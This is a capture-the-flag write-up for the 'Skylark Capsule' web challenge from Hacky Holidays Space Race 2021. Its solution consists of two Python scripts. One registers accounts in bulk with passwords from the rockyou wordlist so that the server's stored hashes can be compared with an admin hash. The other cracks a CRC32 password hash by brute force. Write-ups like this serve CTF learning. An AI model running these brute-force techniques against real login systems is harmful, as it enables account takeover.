---
name: Skylark Capsule (2021)
event: Hacky Holidays Space Race CTF 2021
category: Web
description: Writeup for Skylark Capsule (Web) - Hacky Holidays Space Race CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Skylark Capsule

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/hY446_xs-DE/0.jpg)](https://youtu.be/hY446_xs-DE?t=3860s "Hacky Holidays Space Race 2021: Skylark Capsule")

## Challenge Description

> We have the best capsules available for your deployment into space!

## Solution

#### brute.py

{% code overflow="wrap" %}
```py
from pwn import *
import requests
import json

# Change between info/debug for more verbosity
context.log_level = 'debug'

url = 'https://todo.challenge.hackazon.org'
wordlist = open('/usr/share/wordlists/rockyou.txt', 'r')
admin_pw = '-432570933'  # Got this from part 1 of challenge

for count, password in enumerate(wordlist):
    headers = {}
    password = password.strip()
    if password:
        # Creds to try
        credentials = {
            'username': 'y' + str(count),
            'email': str(count),
            'password': password
        }

        # Register new account
        response = requests.post(url + "/user/register", json=credentials)
        del credentials['email']  # Don't need email to login

        # Login with new account
        response = requests.post(url + "/user/login", json=credentials)

        # Assign JWT token as auth header
        headers['Authorization'] = 'Bearer ' + json.loads(response.text)['token']

        # Get capsule spec
        response = requests.get(url + "/user/capsule", headers=headers)

        # Extract the password
        hashed_pw = json.loads(response.text)['data'][0]['password']
        debug(admin_pw + ': ' + hashed_pw + ' (' + password + ')')

        # If we get a match, quit!
        if hashed_pw == admin_pw:
            print("Success! Correct password was: " + password)
            wordlist.close()
            quit()

        # Track progress / performance
        if((count + 1) % 100 == 0):
            print(str(count + 1) + " attempts so far..")

# Maybe we need new password list?
print("Failed to find correct password :(")
wordlist.close()
```
{% endcode %}

#### hashcrack.py

{% code overflow="wrap" %}
```py
from pwn import *
import zlib

wordlist = open('/usr/share/wordlists/rockyou.txt', 'r')
admin_pw = -432570933
initial_pw = 'skylark'

for count in range(99999999999):
    password = str(count)
    hashed_pw = zlib.crc32(password.encode())
    print(hashed_pw)
    # If we get a match, quit!
    if hashed_pw == admin_pw:
        print("Success! Correct password was: " + password)
        wordlist.close()
        quit()

    # Track progress / performance
    if((count + 1) % 100 == 0):
        print(str(count + 1) + " attempts so far..")

# Maybe we need new password list?
print("Failed to find correct password :(")
wordlist.close()
```
{% endcode %}
